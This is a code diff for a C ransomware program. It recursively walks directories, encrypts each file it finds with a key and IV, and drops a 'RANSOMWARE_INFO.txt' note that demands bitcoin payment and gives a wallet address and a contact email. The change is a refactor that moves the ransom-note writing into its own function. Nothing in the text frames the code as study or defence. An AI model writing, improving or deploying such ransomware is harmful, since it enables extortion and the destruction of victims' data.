@@ -10,6 +10,7 @@
 
 void ls_dir(char* start_path);
 void encryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv);
+void TEXT_RANSOMWARE_INFO(char* start_path_readme);
 
 int main()
 {
@@ -40,11 +41,8 @@ int main()
     strcpy(start_path_readme, start_path);
     strcat(start_path_readme, "RANSOMWARE_INFO.txt");
     
-    FILE* fpreadme; //file RANSOMEWARE_INFO
-    fpreadme=fopen(start_path_readme,"w");
-    fprintf(fpreadme,"You have been PWNED! \n\n Hear me ROAR All files belong to me and are in an encrypted state. I have but two simple commands.\n\n 1. Tranfer money to my bitcoin address \n 2. Email me with your bitcoin address that you used to send the money. Then I will email with an antidote \n\n Pay me Now! \n My Bitcoin Address:Xg7665tgf677hhjhjhhh\n Email:xxxyy@yandex.ru \n");
-    fclose(fpreadme);//full_path_readme_count++;
-    
+    TEXT_RANSOMWARE_INFO(start_path_readme);
+
     return 0;
 }
 
@@ -82,16 +80,6 @@ void ls_dir(char* start_path)
                         
                         fpin=fopen(full_path,"rb");
                         fpout=fopen(new_name,"wb");
-                        
-                        //ONLY ONE RANSOMWARE_INFO
-                        //printf("%zu", strlen(start_path));  //35
-                        /*
-                         if (strlen(start_path)==35){
-                         fpreadme=fopen(full_path_readme,"w");
-                         fprintf(fpreadme,"You have been PWNED! \n\n Hear me ROAR All files belong to me and are in an encrypted state. I have but two simple commands.\n\n 1. Tranfer money to my bitcoin address \n 2. Email me with your bitcoin address that you used to send the money. Then I will email with an antidote \n\n Pay me Now! \n My Bitcoin Address:Xg7665tgf677hhjhjhhh\n Email:xxxyy@yandex.ru \n");
-                         fclose(fpreadme);
-                         }
-                         */
                         
                         encryptfile(fpin,fpout,key,iv);
                         
@@ -152,4 +140,20 @@ void encryptfile(FILE * fpin, FILE* fpout,unsigned char* key, unsigned char* iv)
     
     free(cipher_buf);
     free(read_buf);
+}
+
+void TEXT_RANSOMWARE_INFO(char* start_path_readme){
+    FILE* fpreadme; //file RANSOMEWARE_INFO
+    
+    fpreadme=fopen(start_path_readme,"w");
+    
+    fprintf(fpreadme, "You have been PWNED!\n\n");
+    fprintf(fpreadme, "Hear me ROAR All files belong to me and are in an encrypted state. I have but two simple commands.\n\n");
+    fprintf(fpreadme, "1. Tranfer money to my bitcoin address\n");
+    fprintf(fpreadme, "2. Email me with your bitcoin address that you used to send the money. Then I will email with an antidote \n\n");
+    fprintf(fpreadme, "Pay me Now!\n");
+    fprintf(fpreadme, "My Bitcoin Address:Xg7665tgf677hhjhjhhh\n");
+    fprintf(fpreadme, "Email:xxxyy@yandex.ru\n");
+    
+    fclose(fpreadme);//full_path_readme_count++;
 }
